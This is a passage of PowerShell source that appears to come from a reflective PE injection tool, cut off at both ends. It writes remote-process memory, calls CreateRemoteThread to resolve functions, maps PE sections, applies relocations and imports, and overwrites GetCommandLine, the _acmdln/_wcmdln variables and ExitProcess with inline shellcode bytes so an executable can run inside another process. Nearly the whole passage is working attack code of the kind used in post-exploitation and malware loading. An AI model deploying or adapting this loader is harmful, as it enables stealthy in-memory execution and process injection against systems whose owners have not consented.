			    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		    }
		
		    #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		    if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		    {
			    Throw "Call to ReadProcessMemory failed"
		    }
		    [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		    return $ProcAddress
	    }


	    Function Copy-Sections
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			    #Address to copy the section to
			    [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			    #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			    #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			    #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			    #    so truncate SizeOfRawData to VirtualSize
			    $SizeOfRawData = $SectionHeader.SizeOfRawData

			    if ($SectionHeader.PointerToRawData -eq 0)
			    {
				    $SizeOfRawData = 0
			    }
			
			    if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			    {
				    $SizeOfRawData = $SectionHeader.VirtualSize
			    }
			
			    if ($SizeOfRawData -gt 0)
			    {
				    Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			    }
		
			    #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			    if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			    {
				    $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				    [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				    Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				    $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			    }
		    }
	    }


	    Function Update-MemoryAddresses
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $OriginalImageBase,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    [Int64]$BaseDifference = 0
		    $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		    [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		    #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		    if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				    -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		    {
			    return
		    }


		    elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		    {
			    $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			    $AddDifference = $false
		    }
		    elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		    {
			    $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		    }
		
		    #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		    [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		    while($true)
		    {
			    #If SizeOfBlock == 0, we are done
			    $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			    if ($BaseRelocationTable.SizeOfBlock -eq 0)
			    {
				    break
			    }

			    [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			    $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			    #Loop through each relocation
			    for($i = 0; $i -lt $NumRelocations; $i++)
			    {
				    #Get info for this relocation
				    $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				    [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				    #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				    [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				    [UInt16]$RelocType = $RelocationInfo -band 0xF000
				    for ($j = 0; $j -lt 12; $j++)
				    {
					    $RelocType = [Math]::Floor($RelocType / 2)
				    }

				    #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				    #This appears to be true for EXE's as well.
				    #	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				    if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						    -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				    {			
					    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
					    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					    if ($AddDifference -eq $true)
					    {
						    [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					    }
					    else
					    {
						    [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					    }				

					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				    }
				    elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				    {
					    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				    }
			    }
			
			    $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		    }
	    }


	    Function Import-DllImports
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 4, Mandatory = $false)]
		    [IntPtr]
		    $RemoteProcHandle
		    )
		
		    $RemoteLoading = $false
		    if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		    {
			    $RemoteLoading = $true
		    }
		
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		    {
			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			    while ($true)
			    {
				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				    #If the structure is null, it signals that this is the end of the array
				    if ($ImportDescriptor.Characteristics -eq 0 `
						    -and $ImportDescriptor.FirstThunk -eq 0 `
						    -and $ImportDescriptor.ForwarderChain -eq 0 `
						    -and $ImportDescriptor.Name -eq 0 `
						    -and $ImportDescriptor.TimeDateStamp -eq 0)
				    {
					    Write-Verbose "Done importing DLL imports"
					    break
				    }

				    $ImportDllHandle = [IntPtr]::Zero
				    $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				    if ($RemoteLoading -eq $true)
				    {
					    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				    }
				    else
				    {
					    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				    }

				    if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				    {
					    throw "Error importing DLL, DLLName: $ImportDllPath"
				    }
				
				    #Get the first thunk, then loop through all of them
				    [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				    while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				    {
					    $ProcedureName = ''
					    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					    #	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					    #	and doing the comparison, just see if it is less than 0
					    [IntPtr]$NewThunkRef = [IntPtr]::Zero
					    if([Int64]$OriginalThunkRefVal -lt 0)
					    {
						    $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					    }
					    else
					    {
						    [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						    $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						    $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					    }
					
					    if ($RemoteLoading -eq $true)
					    {
						    [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					    }
					    else
					    {
						    [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					    }
					
					    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					    {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					    }

					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				    }
				
				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			    }
		    }
	    }

	    Function Get-VirtualProtectValue
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [UInt32]
		    $SectionCharacteristics
		    )
		
		    $ProtectionFlag = 0x0
		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		    {
			    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				    }
			    }
			    else
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				    }
			    }
		    }
		    else
		    {
			    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_READONLY
				    }
			    }
			    else
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				    }
			    }
		    }
		
		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		    {
			    $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		    }
		
		    return $ProtectionFlag
	    }

	    Function Update-MemoryProtectionFlags
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			    [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			    [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			    [UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			    [UInt32]$OldProtectFlag = 0
			    Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			    $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Unable to change memory protection"
			    }
		    }
	    }
	
	    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	    Function Update-ExeFunctions
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [String]
		    $ExeArguments,
		
		    [Parameter(Position = 4, Mandatory = $true)]
		    [IntPtr]
		    $ExeDoneBytePtr
		    )
		
		    #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		    $ReturnArray = @() 
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		    [UInt32]$OldProtectFlag = 0
		
		    [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		    if ($Kernel32Handle -eq [IntPtr]::Zero)
		    {
			    throw "Kernel32 handle null"
		    }
		
		    [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		    if ($KernelBaseHandle -eq [IntPtr]::Zero)
		    {
			    throw "KernelBase handle null"
		    }

		    #################################################
		    #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		    #	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		    $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		    $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		    [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		    [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		    if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		    {
			    throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		    }

		    #Prepare the shellcode
		    [Byte[]]$Shellcode1 = @()
		    if ($PtrSize -eq 8)
		    {
			    $Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		    }
		    $Shellcode1 += 0xb8
		
		    [Byte[]]$Shellcode2 = @(0xc3)
		    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		    #Make copy of GetCommandLineA and GetCommandLineW
		    $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		    $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		    $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		    $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		    $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		    $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		    #Overwrite GetCommandLineA
		    [UInt32]$OldProtectFlag = 0
		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		    if ($Success = $false)
		    {
			    throw "Call to VirtualProtect failed"
		    }
		
		    $GetCommandLineAAddrTemp = $GetCommandLineAAddr
		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		    #Overwrite GetCommandLineW
		    [UInt32]$OldProtectFlag = 0
		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		    if ($Success = $false)
		    {
			    throw "Call to VirtualProtect failed"
		    }
		
		    $GetCommandLineWAddrTemp = $GetCommandLineWAddr
		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    #################################################
		
		
		    #################################################
		    #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		    #	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		    #	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		    #	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		    $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		    foreach ($Dll in $DllList)
		    {
			    [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			    if ($DllHandle -ne [IntPtr]::Zero)
			    {
				    [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				    [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				    if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				    {
					    "Error, couldn't find _wcmdln or _acmdln"
				    }
				
				    $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				    $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				    #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				    $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				    $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				    $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				    $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				    $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				    $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				    $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				    if ($Success = $false)
				    {
					    throw "Call to VirtualProtect failed"
				    }
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				    $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				    $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				    if ($Success = $false)
				    {
					    throw "Call to VirtualProtect failed"
				    }
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				    $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			    }
		    }
		    #################################################
		
		
		    #################################################
		    #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		    $ReturnArray = @()
		    $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		    #CorExitProcess (compiled in to visual studio c++)
		    [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		    if ($MscoreeHandle -eq [IntPtr]::Zero)
		    {
			    throw "mscoree handle null"
		    }
		    [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		    if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		    {
			    Throw "CorExitProcess address not found"
		    }
		    $ExitFunctions += $CorExitProcessAddr
		
		    #ExitProcess (what non-managed programs use)
		    [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		    if ($ExitProcessAddr -eq [IntPtr]::Zero)
		    {
			    Throw "ExitProcess address not found"
		    }
		    $ExitFunctions += $ExitProcessAddr
		
		    [UInt32]$OldProtectFlag = 0
		    foreach ($ProcExitFunctionAddr in $ExitFunctions)
		    {
			    $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			    #The following is the shellcode (Shellcode: ExitThread.asm):
			    #32bit shellcode
			    [Byte[]]$Shellcode1 = @(0xbb)
			    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			    #64bit shellcode (Shellcode: ExitThread.asm)
			    if ($PtrSize -eq 8)
			    {
				    [Byte[]]$Shellcode1 = @(0x48, 0xbb)
				    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			    }
			    [Byte[]]$Shellcode3 = @(0xff, 0xd3)
			    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			    [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			    if ($ExitThreadAddr -eq [IntPtr]::Zero)
			    {
				    Throw "ExitThread address not found"
			    }

			    $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Call to VirtualProtect failed"
			    }
			
			    #Make copy of original ExitProcess bytes
			    $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			    $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			    $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
